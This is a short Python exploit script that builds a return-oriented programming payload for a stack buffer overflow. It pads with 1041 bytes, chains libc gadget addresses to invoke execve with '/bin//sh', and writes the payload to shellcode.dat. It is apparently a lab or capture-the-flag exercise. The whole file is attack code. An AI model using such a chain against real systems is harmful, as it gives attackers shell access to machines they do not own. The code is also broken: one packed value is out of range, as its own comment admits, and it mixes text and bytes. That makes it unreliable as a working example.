#!/usr/bin/python

import struct

import binascii
LIBC_OFFSET = 0x7ffff7a3a000
g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
d1 = 59
g2 = LIBC_OFFSET + 0x1f940 + 0x1ab776 + 0x1d
d2 = 0x00
d3 = 0x00
g3 = LIBC_OFFSET + 0x1f940 + 0xb8993 + 0xe
d4 = 0x222f62696e2f2f736822 #integer out of range for 'q' format code
d5 = 0x00

g4 = LIBC_OFFSET + 0x1f940 + 0x132bae + 0xe


shellcode = 'A'*(1041)

shellcode += struct.pack('<q', g1)
shellcode += struct.pack('<q', d1)
shellcode += struct.pack('<q', g2)
shellcode += struct.pack('<q', d2)
shellcode += struct.pack('<q', d3)
shellcode += struct.pack('<q', g3)
shellcode += struct.pack('<q', d4)
shellcode += struct.pack('<q', g4)

print ("shellcode: "+ shellcode)
with open("shellcode.dat", "wb") as f:
    f.write(shellcode)
print (binascii.hexlify(shellcode))
print ("g1: %x" % (g1))